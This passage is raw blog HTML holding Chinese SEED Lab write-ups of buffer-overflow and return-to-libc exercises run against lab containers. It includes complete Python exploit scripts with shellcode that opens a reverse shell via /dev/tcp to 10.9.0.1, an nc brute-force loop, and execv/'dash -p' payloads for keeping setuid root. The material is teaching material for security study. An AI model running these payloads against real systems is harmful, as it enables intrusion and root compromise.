class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;==== Returned Properly ====\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译程序：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ make</span><br><span class="line">gcc -o server server.c</span><br><span class="line">gcc -DBUF_SIZE=100 -DSHOW_FP -z execstack -fno-stack-protector -static -m32 -o stack-L1 stack.c</span><br><span class="line">gcc -DBUF_SIZE=180 -z execstack -fno-stack-protector -static -m32 -o stack-L2 stack.c</span><br><span class="line">gcc -DBUF_SIZE=200 -DSHOW_FP -z execstack -fno-stack-protector -o stack-L3 stack.c</span><br><span class="line">gcc -DBUF_SIZE=80 -DSHOW_FP -z execstack -fno-stack-protector -o stack-L4 stack.c</span><br><span class="line">❯ make install</span><br><span class="line">cp server ../bof-containers</span><br><span class="line">cp stack-* ../bof-containers</span><br></pre></td></tr></table></figure>

<p>建立docker镜像：</p>
<img src="/posts/637eab0b/docker.png" class="" title="docker">

<h3 id="Task-1：Get-Familiar-with-the-Shellcode"><a href="#Task-1：Get-Familiar-with-the-Shellcode" class="headerlink" title="Task 1：Get Familiar with the Shellcode"></a>Task 1：Get Familiar with the Shellcode</h3><p>shellcode基本原理为执行命令”&#x2F;bin&#x2F;sh”，从而获取shell</p>
<p>shellcode_32.py, shellcode_64.py运行，编译call_shellcode.c，运行文件，执行codefile</p>
<img src="/posts/637eab0b/shellcode.png" class="">

<p>修改shellcode_32.py，使其codefile可以删除文件（shellcode_64同理）：</p>
<img src="/posts/637eab0b/%E4%BF%AE%E6%94%B9shellcode.png" class="" title="修改shellcode">

<h3 id="Task-2：Level-1-Attack"><a href="#Task-2：Level-1-Attack" class="headerlink" title="Task 2：Level-1 Attack"></a>Task 2：Level-1 Attack</h3><p>使用<code>echo hello | nc 10.9.0.5 9090</code>命令连接server1 9090端口，建立TCP连接后服务端会自动运行stack程序。</p>
<img src="/posts/637eab0b/%E6%B5%8B%E8%AF%95%E6%9C%8D%E5%8A%A1nc.png" class="" title="测试服务nc">

<p>根据ebp地址和buffer地址，构造python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;/bin/bash	-i &gt;/dev/tcp/10.9.0.1/7070 0&lt;&amp;1 2&gt;&amp;1          *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffffd7e8</span>     <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">0xffffd7e8</span> - <span class="number">0xffffd778</span> + <span class="number">4</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + <span class="number">4</span>] = (ret).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>结果成功获取到root权限shell。</p>
<img src="/posts/637eab0b/level1-result.png" class="" title="level1-result">

<h3 id="Task-3：Level-2-Attack"><a href="#Task-3：Level-2-Attack" class="headerlink" title="Task 3：Level-2 Attack"></a>Task 3：Level-2 Attack</h3><p>buffer大小未知，可以通过喷射法来填充大量地址。</p>
<p>向server2发送nc连接请求，获取到buffer地址</p>
<img src="/posts/637eab0b/server2-echo%20hello.png" class="" title="server2-echo hello">

<p>构造python脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/7070 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffffd728</span> + start    <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">300</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[<span class="number">0</span>:offset + <span class="number">4</span>] = (ret).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)*<span class="number">76</span></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>



<p>获取到shell</p>
<img src="/posts/637eab0b/level2-result.png" class="" title="level2-result">

<h3 id="Task-4：Level-3-Attack"><a href="#Task-4：Level-3-Attack" class="headerlink" title="Task 4：Level-3 Attack"></a>Task 4：Level-3 Attack</h3><p>向server3发送nc连接请求，发现可以看到rbp和buffer地址。通过将shellcode放在ret前解决。</p>
<img src="/posts/637eab0b/echo-hello-server3.png" class="" title="echo-hello-server3">

<p>构造python脚本如下，已知rbp和buffer地址，将shellcode放在前面即可，此处直接设置start为0：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/7070 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">0</span>               <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0x7fffffffe650</span>    <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">0x7fffffffe720</span> - <span class="number">0x7fffffffe650</span> + <span class="number">8</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + <span class="number">8</span>] = (ret).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>获取到root权限的shell：</p>
<img src="/posts/637eab0b/echo-hello-server3.png" class="" title="echo-hello-server3">

<h3 id="Task-5：Level-4-Attack"><a href="#Task-5：Level-4-Attack" class="headerlink" title="Task 5：Level-4 Attack"></a>Task 5：Level-4 Attack</h3><p>向server4发送nc连接请求，但是buffer size很小，由返回结果可知buffer size为0x60，为96长度，小于shellcode长度，因此考虑使用main函数fread参数的shellcode，由于地址离rbp较远且无法得知，因此尝试遍历爆破出结果，此处应尽量保证shellcode前有尽可能多的nop指令，所以start可以设置为末尾。</p>
<img src="/posts/637eab0b/ehco-hello-server3.png" class="" title="ehco-hello-server3">

<p>构造python脚本如下，使用循环向server4发送请求：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/7070 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0x7fffffffe650</span>    <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">0x60</span> + <span class="number">8</span>              <span class="comment"># Change this number </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">  ret += <span class="number">40</span></span><br><span class="line">  <span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">  content[offset:offset + <span class="number">8</span>] = (ret).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">  <span class="comment">##################################################################</span></span><br><span class="line">  <span class="comment"># Write the content to a file</span></span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(content)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;ret: <span class="subst">&#123;ret&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(os.system(<span class="string">&quot;cat badfile | nc 10.9.0.8 9090&quot;</span>))</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>python运行如下，结果会停在某个地址，表示在此ret地址下可以成功建立连接。</p>
<img src="/posts/637eab0b/level4-result-1.png" class="" title="level4-result-1">

<p>获取server4 root权限shell：</p>
<img src="/posts/637eab0b/level4-result-2.png" class="" title="level4-result-2">

<h3 id="Task-6-Experimenting-with-the-Address-Randomization"><a href="#Task-6-Experimenting-with-the-Address-Randomization" class="headerlink" title="Task 6: Experimenting with the Address Randomization"></a>Task 6: Experimenting with the Address Randomization</h3><p>开启ASLR机制后，向server1和server2发送<code>echo hello | nc 10.9.0.* 9090</code>请求，查看rbp和buffer地址。</p>
<p> <code>server1</code></p>
<img src="/posts/637eab0b/%E5%BC%80%E5%90%AFASLR%E5%90%8Eserver1.png" class="" title="开启ASLR后server1">

<p><code>server2</code></p>
<img src="/posts/637eab0b/%E5%BC%80%E5%90%AFASLR%E5%90%8Eserver2.png" class="" title="image-20231024231535611">

<p>可以看出rbp和buffer地址每次都会改变，即ASLR机制会在程序加载时随机化程序在内存地址</p>
<p>尝试暴力破解：（运行17分钟没有爆破成功…）</p>
<img src="/posts/637eab0b/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-server.png" class="" title="暴力破解">

<h3 id="Tasks-7-Experimenting-with-Other-Countermeasures"><a href="#Tasks-7-Experimenting-with-Other-Countermeasures" class="headerlink" title="Tasks 7: Experimenting with Other Countermeasures"></a>Tasks 7: Experimenting with Other Countermeasures</h3><ol>
<li><p><strong>Task 7.a: Turn on the StackGuard Protection</strong>  </p>
<p>setuid实验已完成此项重复内容，此处不在赘述</p>
</li>
<li><p><strong>Task 7.b: Turn on the Non-executable Stack Protection</strong>  </p>
<p> setuid实验已完成此项重复内容，此处不在赘述</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>缓冲区溢出</tag>
        <tag>SEED_Lab</tag>
      </tags>
  </entry>
  <entry>
    <title>【SEED Lab2.0】Return_to_Libc实验报告</title>
    <url>/posts/53f1e8f.html</url>
    <content><![CDATA[<h3 id="Task1：Finding-out-the-Addresses-of-libc-Functions"><a href="#Task1：Finding-out-the-Addresses-of-libc-Functions" class="headerlink" title="Task1：Finding out the Addresses of libc Functions"></a>Task1：Finding out the Addresses of libc Functions</h3><ol>
<li><p>获取system函数和exit函数地址</p>
<img src="/posts/53f1e8f/%E8%8E%B7%E5%8F%96system%E5%92%8Cexit%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80.png" class="" title="获取system和exit函数地址">
</li>
<li><p>gdb批处理命令，新建文件<code>peda-session-retlib.txt</code>，进行批处理操作</p>
<img src="/posts/53f1e8f/batch%E5%A4%84%E7%90%86gdb.png" class="" title="batch处理gdb"></li>
</ol>
<h3 id="Task2：Putting-the-shell-string-in-the-memory"><a href="#Task2：Putting-the-shell-string-in-the-memory" class="headerlink" title="Task2：Putting the shell string in the memory"></a>Task2：Putting the shell string in the memory</h3><ol>
<li><p>编写<code>getprt.c</code>来获取环境变量地址</p>
<p><code>getprt.c</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">char</span>* shell = getenv(<span class="string">&quot;MYSHELL&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (shell)</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)shell);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置<code>/bin/sh</code>的环境变量，获得地址：</p>
<img src="/posts/53f1e8f/getprt.png" class="" title="getprt">

<p>将代码加入到retlib.c中，获取到地址，可以发现地址与<code>getprt</code>的地址相同。（如果开启aslr或者两文件名长度不同则会不同）</p>
<img src="/posts/53f1e8f/retlib.png" class="" title="retlib">

<h3 id="Task-3-Launching-the-Attack"><a href="#Task-3-Launching-the-Attack" class="headerlink" title="Task 3: Launching the Attack"></a>Task 3: Launching the Attack</h3><ol>
<li><p>构造python脚本，进行攻击</p>
<p><code>exploit.py</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Y = <span class="number">0xffffcd58</span> - <span class="number">0xffffcd40</span> + <span class="number">4</span></span><br><span class="line">system_addr = <span class="number">0xf7e12420</span>   <span class="comment"># The address of system()</span></span><br><span class="line">content[Y:Y+<span class="number">4</span>] = (system_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">X = Y + <span class="number">8</span></span><br><span class="line">sh_addr = <span class="number">0xffffd3e5</span>       <span class="comment"># The address of &quot;/bin/sh&quot;</span></span><br><span class="line">content[X:X+<span class="number">4</span>] = (sh_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Z = Y + <span class="number">4</span></span><br><span class="line">exit_addr = <span class="number">0xf7e04f80</span>     <span class="comment"># The address of exit()</span></span><br><span class="line">content[Z:Z+<span class="number">4</span>] = (exit_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>攻击结果如下：</p>
<img src="/posts/53f1e8f/exploit.png" class="" title="exploit">
</li>
<li><p>Attack variation 1: 删去exit()函数地址 ，发现虽然可以成功获取命令行，但是无法正常退出。</p>
<img src="/posts/53f1e8f/%E5%88%A0%E5%8E%BBexit.png" class="" title="删去exit">
</li>
<li><p>Attack variation 2:修改retlib函数长度为newretlib，发现地址发生变化，无法正确执行命令。</p>
<img src="/posts/53f1e8f/%E4%BF%AE%E6%94%B9%E9%95%BF%E5%BA%A6.png" class="" title="修改长度"></li>
</ol>
<h3 id="Task-4-Defeat-Shell’s-countermeasure"><a href="#Task-4-Defeat-Shell’s-countermeasure" class="headerlink" title="Task 4: Defeat Shell’s countermeasure"></a>Task 4: Defeat Shell’s countermeasure</h3><ol>
<li><p>将&#x2F;bin&#x2F;sh与&#x2F;bin&#x2F;dash链接，重新进行实验。</p>
<p>虽然&#x2F;bin&#x2F;sh和&#x2F;bin&#x2F;dash都会对用户setuid权限进行检查，导致无法获取到root权限，但是如果加上-p参数，就可以绕过。可以让程序直接执行”&#x2F;bin&#x2F;dash -p”命令获取root权限。</p>
</li>
<li><p>获取execv函数地址：</p>
<img src="/posts/53f1e8f/execv%E5%9C%B0%E5%9D%80.png" class="" title="execv地址">
</li>
<li><p>构造脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>))</span><br><span class="line"></span><br><span class="line">start = <span class="number">28</span></span><br><span class="line"></span><br><span class="line">execv_addr = <span class="number">0xf7e994b0</span>    <span class="comment"># The address of system()</span></span><br><span class="line">content[start:start+<span class="number">4</span>] = (execv_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># The first argument of execv()</span></span><br><span class="line">exit_addr = <span class="number">0xf7e04f80</span>     <span class="comment"># The address of exit()</span></span><br><span class="line">content[start+<span class="number">4</span>:start+<span class="number">8</span>] = (exit_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bash_addr = <span class="number">0xffffd3e2</span>       <span class="comment"># The address of &quot;/bin/dash&quot;</span></span><br><span class="line">p_addr = <span class="number">0xffffde99</span> <span class="comment"># The address of &quot;-p&quot;</span></span><br><span class="line">content[start+<span class="number">8</span>:start+<span class="number">12</span>] = (bash_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># The second argument of execv()</span></span><br><span class="line">argv = <span class="number">0xffffcd78</span> + <span class="number">504</span>   <span class="comment"># address of argv[]</span></span><br><span class="line">content[start+<span class="number">12</span>: start+<span class="number">16</span>] = (argv).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment"># Construct the argv[] array</span></span><br><span class="line">arg1_addr = bash_addr</span><br><span class="line">arg2_addr = p_addr</span><br><span class="line">arg3_addr = <span class="number">0x0</span></span><br><span class="line">content[<span class="number">504</span>: <span class="number">508</span>] = (arg1_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[<span class="number">508</span>: <span class="number">512</span>] = (arg2_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[<span class="number">512</span>: <span class="number">516</span>] = (arg3_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  